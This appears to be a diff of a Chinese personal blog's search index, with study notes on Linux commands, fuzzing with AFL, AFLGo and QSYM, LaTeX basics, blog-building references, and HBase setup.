+<h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><p>格式： <code>tar [-zjxcvfpP] filename</code><br>参数说明：<br><code>-z</code>:打包同时使用gzip压缩，<code>-j</code>:同时使用bzip2压缩，<code>-J</code>:同时使用xz压缩<br><code>-x</code>:解包或者解压，<code>-c</code>建立一个tar包或者压缩包<br><code>-v</code>可视化，，<code>-t</code>查看文件，<code>-f</code>操作的文件<br>举例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -cvf a.tar a 将文件或目录a打包成a.tar</span><br><span class="line">tar -czvf a.tar.gz a 将文件或者目录打包并使用gzip压缩</span><br><span class="line">tar -tf a.tar.gz 查看文件列表</span><br><span class="line">tar -zxvf a.tar.gz 解压</span><br></pre></td></tr></table></figure>
+
+<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>上面列举的三个都不支持压缩目录，该工具支持压缩目录，但是要压缩需要指定目录下的文件<br>压缩：<code>zip test.zip test/*</code><br><code>zip -r test.zip test/</code> 一并压缩二级目录，不需要星号了<br>解压：<code>unzip test.zip</code></p>
+<h1 id="0x04软件安装"><a href="#0x04软件安装" class="headerlink" title="0x04软件安装"></a>0x04软件安装</h1><h2 id="ubuntu系统下"><a href="#ubuntu系统下" class="headerlink" title="ubuntu系统下"></a>ubuntu系统下</h2><p>一般使用<code>apt-get</code>。apt-get命令适用于deb包管理式的Linux操作系统（Debian、Ubuntu等），主要用于自动从互联网软件仓库中搜索、下载、安装、升级、卸载软件或操作系统[2]。<br>普通安装<code>apt-get install PackageName</code><br>重新安装<code>apt-get --reinstall install PackageName</code><br>修复依赖关系<code>apt-get -f install</code><br>下载源码<code>apt-get source PackageName</code><br>删除软件包，保留配置文件<code>apt-get remove PackageName</code><br>删除软件包，同时删除配置文件<code>apt-get purge PackageName</code><br>清楚已经下载的软件包和旧安装包<code>apt-get clean &amp;&amp; apt-get autoclean</code><br>更新安装源<code>apt-get update</code><br>列出已经安装的所有软件包<code>dpkg -l</code></p>
+<p>安装.deb格式的软件安装包<code>dpkg -i xxxx.deb</code></p>
+<h1 id="0x05正则表达式与流式编辑工具"><a href="#0x05正则表达式与流式编辑工具" class="headerlink" title="0x05正则表达式与流式编辑工具"></a>0x05正则表达式与流式编辑工具</h1><h2 id="正则基础"><a href="#正则基础" class="headerlink" title="正则基础"></a>正则基础</h2><p><code>.</code> 匹配任意单个字符<br><code>?</code> 匹配0到1次<br><code>*</code> 匹配0到多次<br><code>+</code> 匹配1到多次<br><code>{n}</code> 匹配n次<br><code>{n,}</code>匹配n到多次；<code>{n,m}</code>匹配n到m次<br><code>.*</code>匹配任意字符<br><code>^</code>行首，<code>$</code>行尾 <code>\&lt;</code>，<code>\&gt;</code>单词首尾边界<br><code>|</code> 连接操作符<br><code>[]</code>字符序列单字符占位</p>
+<h2 id="grep-egrep"><a href="#grep-egrep" class="headerlink" title="grep/egrep"></a>grep/egrep</h2><p>功能：流式文本工具，面向行编辑<br>命令格式：<code>grep [-cinvABC] pattern fileName</code><br>说明：<code>-c</code>打印符合要求的行数，<code>-i</code>忽略大小写，<code>-n</code>输出符号要求的行和行号，<code>-v</code>输出不符合要求的行，<code>-A number</code>输出符合要求的行及下两行，<code>-B number</code> 行及上两行，<code>-c number</code>行及上下各两行，<code>-e</code>使用扩展的正则表达式。<br>正则式+是不能再grep中使用的<br>举例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -B 2 &apos;df&apos; test.txt 打印出test.txt中字符串df的行及上两行，也可写成-B2</span><br><span class="line">grep -n &apos;df&apos; test.txt 打印出df所在行及行号</span><br><span class="line">grep -nv &apos;df&apos; test.txt 打印没有df的行及行号</span><br><span class="line">grep &apos;[0-9]&apos; test.txt 过滤出数字行</span><br><span class="line">grep -v &apos;^#&apos; test.txt 过滤掉所有#开头的行</span><br><span class="line">grep -e &apos;[0-9]&#123;4&#125; test.txt 不加-e的话就需要这样写 grep &quot;[0-9]\&#123;4\&#125;&quot; test.txt</span><br><span class="line">grep &quot;&lt;ooxx&gt;&quot; test.txt 选出包含单词ooxx的行</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="http://www.apelearn.com/study_v2/" target="_blank" rel="noopener">http://www.apelearn.com/study_v2/</a><br>[2] <a href="https://blog.csdn.net/xietansheng/article/details/80044644" target="_blank" rel="noopener">https://blog.csdn.net/xietansheng/article/details/80044644</a></p>
+]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>software-intro</title>
+    <url>/2019/12/04/software-intro/</url>
+    <content><![CDATA[<p>software library</p>
+<a id="more"></a>
+<h1 id="代码阅读"><a href="#代码阅读" class="headerlink" title="代码阅读"></a>代码阅读</h1><h2 id="Understand"><a href="#Understand" class="headerlink" title="Understand"></a>Understand</h2><p>以直观地看到项目结构和规模，灰框代表一个文件夹，蓝色方块代表了一个文件，其大小和颜色分别反映了行数和文件复杂度。</p>
+<h1 id="终端神器"><a href="#终端神器" class="headerlink" title="终端神器"></a>终端神器</h1><h2 id="MobaXterm"><a href="#MobaXterm" class="headerlink" title="MobaXterm"></a>MobaXterm</h2><p>一个全能的终端神器，shell, vnc, sftp等功能。</p>
+]]></content>
+      <categories>
+        <category>tool</category>
+      </categories>
+      <tags>
+        <tag>software</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fuzzing-basic</title>
+    <url>/2019/12/04/fuzzing-basic/</url>
+    <content><![CDATA[<p>fuzzing介绍与afl安装</p>
+<a id="more"></a>
+
+<h1 id="0x00-fuzzing简单介绍"><a href="#0x00-fuzzing简单介绍" class="headerlink" title="0x00 fuzzing简单介绍"></a>0x00 fuzzing简单介绍</h1><p>fuzzing：一种通过向程序提供<strong>非预期的输入</strong>并监控输出中的<strong>异常</strong>来发现软件中的<strong>故障</strong>的方法。<br>一般代指模糊测试，一种基于黑盒的测试技术。所谓模糊，是指测试用例是模糊的，不确定的，随机性的。Fuzzing技术本质是依靠随机函数生成<strong>随机测试用例</strong>来进行测试验证，所以是不确定的。</p>
+<h2 id="测试用例的产生方式"><a href="#测试用例的产生方式" class="headerlink" title="测试用例的产生方式"></a>测试用例的产生方式</h2><ul>
+<li>基于变异：根据已知数据样本通过变异的方法生成新的测试用例。</li>
+<li>基于生成：根据已知的协议或接口规范进行建模，生成测试用例。</li>
+</ul>
+<h1 id="0x01-AFL"><a href="#0x01-AFL" class="headerlink" title="0x01 AFL"></a>0x01 AFL</h1><p>一个基于变异的fuzzer。American Fuzzy Lop简称AFL。</p>
+<h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>一个强大的Fuzzing测试工具，在源码编译时进行插桩(简称编译时插桩)，可以自动产生测试用例来探索二进制程序内部新的执行路径。</p>
+<blockquote>
+<p>插桩技术是将额外的代码注入程序中以收集运行时的信息；可以分为两类，</p>
+<ul>
+<li>源代码插桩(Source Code Instrumentation(SCI))：额外代码注入到程序源代码中。</li>
+<li>二进制插桩(Binary Instrumentation(BI))：额外代码注入到二进制可执行文件中。</li>
+</ul>
+</blockquote>
+<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p>1) 从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；<br>2) 选择一些输入文件，作为初始测试集加入输入队列（queue）；<br>3) 将队列中的文件按一定的策略进行“突变”；<br>4) 如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;<br>5) 上述过程会一直循环进行，期间触发了crash的文件会被记录下来。<br><img src="/images/fuzzing-basic/01.jpg" alt="pic01"><br>图片来源与文献[5]</p>
+<h2 id="AFL组成"><a href="#AFL组成" class="headerlink" title="AFL组成"></a>AFL组成</h2><p>总共三个部分组成[6]。</p>
+<ul>
+<li>编译器wrapper<blockquote>
+<p>对开源软件编译，编译过程中插入一些AFL识别的函数用以识别探索路径，AFL的编译工具为afl-gcc/afl-g++,afl-clang等。</p>
+</blockquote>
+</li>
+<li>测试器fuzzer<blockquote>
+<p>afl-fuzz是AFL重要的主体，用以对软件进行fuzzing。</p>
+</blockquote>
+</li>
+<li>辅助工具<blockquote>
+<p>afl-cmin，afl-tmin等，为提升测试的效率和成功率而服务。</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">afl-fuzz官网</a></p>
+<blockquote>
+<p>环境：ubuntu16.04， afl-2.52b</p>
+</blockquote>
+<ul>
+<li><p>step1: 下载</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-2.52b.tgz</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>step2: make</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd afl-2.52b</span><br><span class="line">make</span><br><span class="line">sudo  make install</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>在命令行中输入<code>afl-</code>，然后使用tab建，可以看到命令提示，表示安装成功。或者<code>afl-fuzz</code>可以看到提示信息。</p>
+<h2 id="AFL基本使用"><a href="#AFL基本使用" class="headerlink" title="AFL基本使用"></a>AFL基本使用</h2><h3 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h3><p>见参考文献[4]</p>
+<h3 id="插桩编译"><a href="#插桩编译" class="headerlink" title="插桩编译"></a>插桩编译</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">afl-gcc -g -o test test.c</span><br></pre></td></tr></table></figure>
+
+<p>对于其它的编译选项，如make，makefile等编译过程详见参考文献[4]。</p>
+<h3 id="开始fuzzing"><a href="#开始fuzzing" class="headerlink" title="开始fuzzing"></a>开始fuzzing</h3><p>建立一个文件夹<code>fuzz_in</code>，里面放入一些文本文件<br>fuzzing命令的格式:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br><span class="line">afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure>
+
+<p>常见参数的含义：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f: 参数表示：testcase的内容会作为afl_test的stdin</span><br><span class="line">-m: 参数表示分配的内存空间</span><br><span class="line">-i: 指定测试样本的路径</span><br><span class="line">-o: 指定输出结果的路径</span><br><span class="line">/dev/null: 使错误信息不输出到屏幕</span><br><span class="line">-t：设置程序运行超时值，单位为 ms</span><br><span class="line">-M：运行主(Master) Fuzzer</span><br><span class="line">-S：运行从属(Slave) Fuzzer</span><br></pre></td></tr></table></figure>
+
+<p>一个示例：<code>afl-fuzz -m 300 -i fuzz_in -o  fuzz_out ./test -f</code></p>
+<blockquote>
+<p>注意，要在目标程序前加上./，否则会报错误。</p>
+</blockquote>
+<p>成功之后的界面如下：<br><img src="/images/fuzzing-basic/02.png" alt="pic01"></p>
+<p>界面分析信息的<a href="http://lcamtuf.coredump.cx/afl/status_screen.txt" target="_blank" rel="noopener">官方参考文档</a>，或者文献[7]<br>一些主要的信息需要注意：</p>
+<blockquote>
+<ul>
+<li>last new path 目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的。</li>
+<li>cycles done 如果变绿就说明后面即使继续fuzz，出现crash的几率也很低，可以选择在这个时候停止</li>
+<li>uniq crashes 代表的是crash的数量</li>
+<li>stage progress 正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度，如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing。</li>
+</ul>
+</blockquote>
+<h3 id="查看crash"><a href="#查看crash" class="headerlink" title="查看crash"></a>查看crash</h3><p>进入设定的输出文件夹，如fuzz_out/crashes。<br>然后复制crash信息，使用命令<code>xxd id:000000,sig:11,src:000001,op:havoc,rep:4</code></p>
+<h1 id="0x02-AFLGo"><a href="#0x02-AFLGo" class="headerlink" title="0x02 AFLGo"></a>0x02 AFLGo</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><a href="https://github.com/aflgo/aflgo" target="_blank" rel="noopener">官网安装教程</a><br>几点说明：<br>1) 对于官网步骤1：安装<code>llvm</code>环境请看该<a href="https://www.jianshu.com/p/49261b1a50c4" target="_blank" rel="noopener">llvm安装教程</a>，选择<code>llvm6.0.0</code>源码下载（这里有6个软件包需要下载安装）。</p>
+<h3 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h3><p>我安装make的时候出现如下错误<br><img src="/images/fuzzing-basic/03.png" alt="pic01"><br>此时执行下面的命令就可以可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mv /var/lib/dpkg/info/ /var/lib/dpkg/info_old/</span><br><span class="line">$ sudo mkdir /var/lib/dpkg/info/</span><br><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<p>下面这个链接展示了如下在一个<strong>真实开源软件</strong>上进行AFL fuzzing<br><a href="https://github.com/lcatro/Fuzzing-ImageMagick/blob/master/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Fuzzing%E6%8C%96%E6%8E%98ImageMagick%E7%9A%84%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">AFL挖掘ImageMagick漏洞</a></p>
+<h1 id="0x03-qysm"><a href="#0x03-qysm" class="headerlink" title="0x03 qysm"></a>0x03 qysm</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://www.usenix.org/node/217566" target="_blank" rel="noopener">参考论文</a><br>论文摘要</p>
+<blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近，有人提出混合模糊方法来解决模糊和协同执行的局限性。这种混合方法已经在各种综合基准测试中显示出了它的有效性，例如DARPA的网络大挑战(CGC)二进制文件，但是它仍然需要在复杂的、真实世界的软件中寻找缺陷。我们观察到，现有共扼执行器的性能瓶颈是其在小规模研究之外被采用的主要限制因素。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了克服这一问题，我们设计了一个快速的协同执行引擎，称为QSYM，以支持混合模糊。关键思想是使用动态二进制转换将符号模拟与本机执行紧密集成，从而实现更细粒度、更快的指令级符号模拟。此外，QSYM放宽了传统concolic执行者对更好性能的严格可靠性要求，同时利用了一个更快的fuzzer进行验证，为性能优化提供了前所未有的机会，例如，优化地解决约束和修剪无兴趣的基本块。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们的评估表明，QSYM不仅优于最先进的fuzzers(即bug,发现14×超过VUzzer LAVA-M数据集,钻地,比126年104的二进制文件),但也发现了13个未知安全漏洞在Dropbox轻子等八个实际项目,ffmpeg, OpenJPEG,那些已经被集中测试的最先进的fuzz, AFL OSS-Fuzz。</p>
+</blockquote>
+<h2 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h2><p>有一个github开源库<a href="https://github.com/sslab-gatech/qsym" target="_blank" rel="noopener">地址</a><br>该开源库中提供了安装方法</p>
+<p>遇到了一个错误，再使用<code>virtualenv venv</code>命令地时候<br><img src="/images/fuzzing-basic/04.png" alt="pic01"></p>
+<blockquote>
+<p>错误原因，系统地python环境是2.7，需要使用python3.5+版本python。</p>
+</blockquote>
+<p>解决方法：指定python3，使用命令<code>virtualenv -p  /usr/bin/python venv</code>。这个python指向的是python3。更多virtulenv的用法见参考文献[8]</p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://github.com/secfigo/Awesome-Fuzzing" target="_blank" rel="noopener">https://github.com/secfigo/Awesome-Fuzzing</a><br>[2] <a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.1_fuzzing.md" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.1_fuzzing.md</a><br>[3] <a href="https://zhuanlan.zhihu.com/p/43432370" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/43432370</a> fuzzing技术总结<br>[4] <a href="http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/</a> afl使用指南<br>[5] <a href="https://www.freebuf.com/articles/system/191536.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/191536.html</a> AFL漏洞挖掘技术漫谈<br>[6] <a href="https://fly8wo.github.io/2018/09/21/AFL-Fuzz%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85%E4%B8%8E%E7%BC%96%E8%AF%91/" target="_blank" rel="noopener">https://fly8wo.github.io/2018/09/21/AFL-Fuzz%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85%E4%B8%8E%E7%BC%96%E8%AF%91/</a> 简单安装和编译<br>[7] <a href="https://xz.aliyun.com/t/4314" target="_blank" rel="noopener">https://xz.aliyun.com/t/4314</a>  fuzzing简单测试<br>[8] <a href="https://blog.csdn.net/weixin_37773766/article/details/80773590" target="_blank" rel="noopener">https://blog.csdn.net/weixin_37773766/article/details/80773590</a> virtualenv简单介绍</p>
+]]></content>
+      <categories>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>fuzzing</tag>
+        <tag>AFL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>latex-basic</title>
+    <url>/2019/11/29/latex-basic/</url>
+    <content><![CDATA[<p>latex学习记录</p>
+<a id="more"></a>
+<h1 id="0x00-学习环境"><a href="#0x00-学习环境" class="headerlink" title="0x00 学习环境"></a>0x00 学习环境</h1><p>使用<a href="https://www.overleaf.com/" target="_blank" rel="noopener">overleaf</a>环境。</p>
+<h2 id="中文支持"><a href="#中文支持" class="headerlink" title="中文支持"></a>中文支持</h2><p>两步操作<br>1) menu –&gt;  settings –&gt; compile —&gt; 选择XelaTex<br>2) 添加如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\usepackage[UTF8]&#123;ctex&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="一个简单的结构如下"><a href="#一个简单的结构如下" class="headerlink" title="一个简单的结构如下"></a>一个简单的结构如下</h2><p>在<code>\documentclass</code>与<code>\begin{document}</code>之间为导言区，设置真篇文档，一般设置页面大小，页眉页脚样式，章节标题样式。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\usepackage[UTF8]&#123;ctex&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">main text1中文</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01基本命令"><a href="#0x01基本命令" class="headerlink" title="0x01基本命令"></a>0x01基本命令</h1><h2 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h2><p>以反斜线开头，一般有一下两种格式的命令</p>
+<ul>
+<li>无参数<br><code>\command</code><br>eg: \songti 我爱latex</li>
+<li>有参数<br><code>\command [可选参数]{必选参数}</code></li>
+</ul>
+<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><table>
+ <tr><th>命令</th><th>功能</th></tr>
+ <tr><td>\chapter</td><td>章</td></tr>
+ <tr><td>\section</td><td>节</td></tr>
+ <tr><td>\subsection</td><td>小节</td></tr>
+ <tr><td>\paragraph</td><td>带题头段落</td></tr>
+ <tr><td>\centering</td><td>居中对齐</td></tr>
+ <tr><td>\chapter</td><td>章</td></tr>
+ <tr><td>\paragraph</td><td>带题头段落</td></tr>
+ <tr><td>\centering</td><td>居中对齐</td></tr>
+ <tr><td>\emph</td><td>强调</td></tr>
+ <tr><td>\verb</td><td>原样输出</td></tr>
+ <tr><td>\url</td><td>超链接</td></tr>
+ <tr><td>\footnote</td><td>脚注</td></tr>
+ <tr><td>\item</td><td>列表条目</td></tr>
+ <tr><td>\caption</td><td>标题</td></tr>
+ <tr><td>\includegraphics</td><td>插入图片</td></tr>
+ <tr><td>\label</td><td>标号</td></tr>
+ <tr><td>\cite</td><td>引用参考文献</td></tr>
+ <tr><td>\ref</td><td>引用图表公式等</td></tr>
+</table>
+
+<blockquote>
+<p>章\chapter应用在\documentclass{book}下面，在\documentclass{article}不能使用</p>
+</blockquote>
+<h2 id="命令section举例"><a href="#命令section举例" class="headerlink" title="命令section举例"></a>命令section举例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;document&#125;</span><br><span class="line">\section&#123;第一节&#125;</span><br><span class="line">正文</span><br><span class="line">前方高能\footnote&#123;我是注脚&#125;</span><br><span class="line">前方高能\footnote&#123;我是注脚2&#125;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/latex-basic/01.png" alt="pic"></p>
+<h1 id="0x02-环境"><a href="#0x02-环境" class="headerlink" title="0x02 环境"></a>0x02 环境</h1><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><p>无参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;environment&#125;</span><br><span class="line">环境内容</span><br><span class="line">\end&#123;environment&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;environment&#125;[参数]</span><br><span class="line">环境内容</span><br><span class="line">\end&#123;environment&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="常见环境"><a href="#常见环境" class="headerlink" title="常见环境"></a>常见环境</h2><table>
+ <tr><th>环境</th><th>功能</th></tr>
+ <tr><td>\table</td><td>表格</td></tr>
+ <tr><td>\figure</td><td>图片</td></tr>
+ <tr><td>\equation</td><td>公式</td></tr>
+ <tr><td>\itemize</td><td>无编号列表</td></tr>
+ <tr><td>\enumerate</td><td>编号列表</td></tr>
+</table>
+
+<h2 id="环境举例"><a href="#环境举例" class="headerlink" title="环境举例"></a>环境举例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;document&#125;</span><br><span class="line">\begin&#123;equation&#125;</span><br><span class="line">    a^2-b^2=(a+b)(a-b)</span><br><span class="line">\end&#123;equation&#125;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/latex-basic/02.png" alt="pic"></p>
+<h2 id="一个简单的文章结构"><a href="#一个简单的文章结构" class="headerlink" title="一个简单的文章结构"></a>一个简单的文章结构</h2><p>latex提供了几个层次结构。<strong>注意</strong>，article中没有<code>chapter</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其它的如report和book则支持所有的层次。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\part&#123;...&#125;           %Level -1</span><br><span class="line">\chapter&#123;...&#125;        %Level 0</span><br><span class="line">\section&#123;...&#125;        %Level 1</span><br><span class="line">\subsection&#123;...&#125;     %Level 2</span><br><span class="line">\subsubsection&#123;...&#125;  %Level 3</span><br><span class="line">\paragraph&#123;...&#125;      %Level 4</span><br><span class="line">\subparagraph&#123;...&#125;   %Level 5</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\title&#123;杂谈勾股定理&#125;</span><br><span class="line">\author&#123;张三&#125;</span><br><span class="line">\date&#123;\today&#125;</span><br><span class="line"> \bibliographystyle&#123;plain&#125;</span><br><span class="line"> </span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line"> \maketitle</span><br><span class="line"> \tableofcontents</span><br><span class="line"> </span><br><span class="line">\section&#123;勾股定理在古代&#125;</span><br><span class="line">\section&#123;勾股定理的近代形式&#125;</span><br><span class="line"></span><br><span class="line">\bibliography&#123;math&#125;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译之后显示的文件如下：<br><img src="/images/latex-basic/03.png" alt="pic02"></p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://github.com/tuna/thulib-latex-talk" target="_blank" rel="noopener">https://github.com/tuna/thulib-latex-talk</a><br>[2] <a href="https://liam.page/2014/09/08/latex-introduction/" target="_blank" rel="noopener">https://liam.page/2014/09/08/latex-introduction/</a><br>[3] <a href="https://github.com/huangxg/lnotes" target="_blank" rel="noopener">https://github.com/huangxg/lnotes</a>  雷太赫排版系统</p>
+]]></content>
+      <categories>
+        <category>tool</category>
+      </categories>
+      <tags>
+        <tag>latex</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buileSite-ref</title>
+    <url>/2019/11/27/buileSite-ref/</url>
+    <content><![CDATA[<p>建立本站参考的文章</p>
+<a id="more"></a>
+<p>环境</p>
+<blockquote>
+<p>git<br>node.js<br>next v.7.4.0主题</p>
+</blockquote>
+<p>[1] <a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">http://theme-next.iissnan.com/getting-started.html</a><br>大致流程，命令<br>[2] <a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html</a><br>个性化配置教程<br>[3] <a href="https://leomalik.github.io/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html" target="_blank" rel="noopener">https://leomalik.github.io/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a></p>
+<p>添加背景图片<br>[4] <a href="https://bufsnake.github.io/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html" target="_blank" rel="noopener">https://bufsnake.github.io/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html</a></p>
+<p><a href="https://asphelzhn.github.io/2018/12/19/hexo/" target="_blank" rel="noopener">https://asphelzhn.github.io/2018/12/19/hexo/</a></p>
+<p><a href="https://buptccq.top/%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.html" target="_blank" rel="noopener">https://buptccq.top/%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.html</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>hbase-base01</title>
+    <url>/2019/11/25/hbase-base01/</url>
+    <content><![CDATA[<p>hbase基本知识</p>
+<a id="more"></a>
+<p>HBase是一个高可靠，高性能，面向列，可伸缩的分布式数据库，google的BigTable开源实现，主要用来存储非结构化和半结构化的松散数据。</p>
+<blockquote>
+<p>学习版本：HBase1.4</p>
+</blockquote>
+<p>该版本的hadoop版本要求见官网<a href="https://hbase.apache.org/book.html#basic.prerequisites" target="_blank" rel="noopener">版本要求</a><br><a href="https://hbase.apache.org/book.html#getting_started" target="_blank" rel="noopener">官方参考文档</a></p>
+<h1 id="0x00下载安装"><a href="#0x00下载安装" class="headerlink" title="0x00下载安装"></a>0x00下载安装</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
+<li>step1：从官网下载hbase-1.4.11-bin.tar.gz版本的文件。解压缩<code>tar -zxvf hba.....</code></li>
+<li>step2(可选)：为了能够方便使用hbase命令，在/etc/profile中配置环境变量<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH=/opt/hadoop-2.7.1/bin:/opt/hbase-1.4.11/bin:$&#123;PATH&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>使用命令<code>source /etc/profile</code>使之生效。</p>
+<blockquote>
+<p>环境变量配置在<code>~/.bashrc</code>中也可以。</p>
+<ul>
+<li>step3：如果所属用户不是root，此时还需要修改hbase文件的权限。</li>
+<li>step4：通过命令<code>hbase version</code>可以验证是否安装成功，即可查看吧版本信息。<br><img src="/images/hbase-basic/01.png" alt="pic1"></li>
+</ul>
+</blockquote>
+<h2 id="伪分布式模式配置"><a href="#伪分布式模式配置" class="headerlink" title="伪分布式模式配置"></a>伪分布式模式配置</h2><p>hbase有三种模式，单机模式使用本地文件系统存储数据，伪分布式和分布式采用HDFS存储数据。<br>参考文献[1]有具体配置方法</p>
+<h3 id="配置hbase-env-sh。"><a href="#配置hbase-env-sh。" class="headerlink" title="配置hbase-env.sh。"></a>配置<code>hbase-env.sh</code>。</h3><ul>
+<li>配置JAVA_HOME</li>
+<li>配置HBASE_CLASSPATH<br>设置为本机hadoop安装目录下的conf目录。<br>eg:<code>export HBASE_CLASSPATH=/opt/hadoop-2.7.1/etc/hadoop</code></li>
+<li>配置HBASE_MANAGES_ZK<br><code>export HBASE_MANAGES_ZK=true</code>表示hbase自己管理zookeeper，不需要单独zookeeper。</li>
+</ul>
+<h3 id="配置hbase-site-xml"><a href="#配置hbase-site-xml" class="headerlink" title="配置hbase-site.xml"></a>配置<code>hbase-site.xml</code></h3><p>设置<code>hbase.rootdir</code>指定HBase数据的存储位置，即在HDFS上的路径<br>设置<code>hbase.cluter.distrubuted</code>为true。</p>
